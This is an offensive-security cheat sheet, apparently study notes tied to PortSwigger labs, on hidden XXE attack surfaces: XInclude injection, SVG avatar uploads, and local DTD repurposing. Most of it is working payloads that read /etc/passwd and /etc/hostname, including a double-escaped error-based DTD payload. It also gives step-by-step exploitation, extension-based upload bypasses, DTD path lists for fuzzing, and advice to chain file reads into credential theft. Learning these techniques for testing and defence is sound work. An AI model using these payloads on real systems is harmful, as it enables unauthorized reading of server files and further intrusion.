# XXE - Hidden attack surfaces (XInclude, SVG upload, local DTD)

XXE isn't limited to obvious XML POST bodies. XInclude works when your data is embedded into a server-side XML document without DOCTYPE control. SVG/image uploads are parsed as XML. Local DTD repurposing lets you do error-based file read when there's no external network access.

## Quick reference
```xml
<!-- XInclude - inject into any POST param value that gets embedded in XML -->
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>

<!-- SVG file upload - upload as avatar/image -->
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname"> ]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg"
     xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
  <text font-size="16" x="0" y="16">&xxe;</text>
</svg>

<!-- Local DTD repurposing - redefine existing entity (ISOamso) to trigger error with file contents -->
<!DOCTYPE message [
  <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
  <!ENTITY % ISOamso '
    <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
    <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
    &#x25;eval;
    &#x25;error;
  '>
  %local_dtd;
]>
```

## Root cause
- **XInclude:** W3C standard for embedding documents; processed by XML libraries even when you don't control the DOCTYPE. Any parameter value embedded into server-side XML can carry an XInclude directive.
- **SVG:** SVG is XML; browsers and server-side image processors parse it. External entities in SVG headers are processed during rendering.
- **Local DTD:** XML parsers allow redefining entities in an external DTD that was already declared in the internal subset. A known local DTD file can be loaded and its entities redefined to trigger error-based disclosure.

## Find it
**XInclude:**
- POST params whose values are embedded into XML server-side (not the entire body is XML - just one param).
- Test: set param value to `<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>` - if response contains file contents -> XInclude processed.

**SVG upload:**
- Any avatar, image, or document upload that accepts SVG.
- Create minimal SVG with external entity, upload, view rendered result.

**Local DTD:**
- No external network; need to know a DTD that exists on the server.
- Common paths: `/usr/share/yelp/dtd/docbookx.dtd`, `/usr/share/xml/docbook/schema/dtd/4.5/docbookx.dtd`.
- Entity to redefine: look for entity names defined in the DTD (e.g., `ISOamso`).

## Technique
**XInclude:**
1. Intercept POST with a param that seems to build an XML query (e.g., `productId`).
2. Set value to:
   ```
   <foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>
   ```
3. Send -> if the XML library processes XInclude, file contents appear in response.

**SVG file upload:**
1. Create `exploit.svg` locally with the content above (replace `file:///etc/hostname` with target).
2. Go to "Post a comment" (or profile, avatar upload).
3. Upload the SVG as your avatar image.
4. View your comment/profile - the rendered image's text content contains the file value.

**Local DTD repurposing:**
1. Identify the local DTD path (Yelp DocBook DTD is common on Linux).
2. Inject the DOCTYPE block (shown in quick reference) into the XML POST.
3. `%local_dtd;` loads the file; the redefined `ISOamso` entity triggers nested param entities -> error with file contents in response.
4. Note: `&#x26;#x25;` = `&#x25;` = `%` (double-escaped because it's inside a string inside a DTD string).

## Payload arsenal
```xml
<!-- XInclude into POST param -->
<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>

<!-- SVG with entity -->
<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname"> ]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" version="1.1">
  <text font-size="16" x="0" y="16">&xxe;</text>
</svg>

<!-- Local DTD paths to try -->
file:///usr/share/yelp/dtd/docbookx.dtd
file:///usr/share/xml/docbook/schema/dtd/4.5/docbookx.dtd
file:///usr/local/share/sgml/docbook/dtd/4.5/docbookx.dtd

<!-- Entity to redefine (check what's defined in the DTD) -->
ISOamso, ISOlat1, ISOnum, ISOtech
```

## Bypasses
| Obstacle | Approach |
|---|---|
| No DOCTYPE control (embedded XML) | XInclude - works without DOCTYPE |
| XML upload blocked by extension | Try `.xml.svg`, `.svgz`, or rename to accepted extension |
| No external network for DTD exfil | Local DTD repurposing (no network needed) |
| Local DTD path unknown | Fuzz common Linux/Windows system DTD paths |

## Exploitation walkthrough
**XInclude (stock param):** `productId` value = XInclude payload targeting `/etc/passwd` -> response contains `/etc/passwd` contents.

**SVG upload:** Create exploit.svg with `file:///etc/hostname` entity -> upload as avatar -> view rendered comment -> hostname appears as text in image.

**Local DTD:** Inject DOCTYPE with `%local_dtd;` pointing to Yelp DocBook DTD + redefined `ISOamso` -> server tries to open `file:///nonexistent/<passwd-contents>` -> error response leaks the file.

## Chaining
- XInclude file read -> credentials -> further exploitation
- SVG upload -> rendered to PNG/JPEG by ImageMagick -> could also trigger ImageTragick if old IM version
- Local DTD -> error-based exfil -> same result as external DTD approach without network

## Tools
- **Burp Repeater** - XInclude injection
- **Text editor** - create SVG file locally
- **Burp Proxy** - intercept file upload request

## Labs

### Exploiting XInclude to retrieve files [Practitioner]
`productId` param is embedded into XML server-side. Set value to XInclude payload (`xi:include href="file:///etc/passwd"`). Response reflects file contents. Key insight: XInclude is processed without DOCTYPE; attacker only needs to control a text node value.

### Exploiting XXE via image file upload [Practitioner]
Upload SVG with `<!ENTITY xxe SYSTEM "file:///etc/hostname">` and `&xxe;` in `<text>` element. View comment - rendered image contains the hostname. Key insight: SVG is XML; server-side image processing parses entities; the value appears as rendered text.

### Exploiting XXE to retrieve data by repurposing a local DTD [Expert]
No external network. Inject DOCTYPE that loads `/usr/share/yelp/dtd/docbookx.dtd` and redefines `ISOamso` to chain nested param entities into a file-not-found error containing `/etc/passwd` contents. Key insight: entity redefinition in external DTD bypasses internal-subset restriction; local system DTDs enable full exploitation without any outbound requests.

## Real-world notes
- XInclude attacks are underrated - many devs don't realise their XML processing pipeline handles XInclude.
- SVG upload XXE is common on social platforms and CMSes - always test profile/avatar upload with an SVG.
- Local DTD technique is critical for airgapped or firewalled targets; DocBook DTD is present on most Linux distros with GNOME.

## References
- https://portswigger.net/web-security/xxe
- https://portswigger.net/web-security/xxe/blind
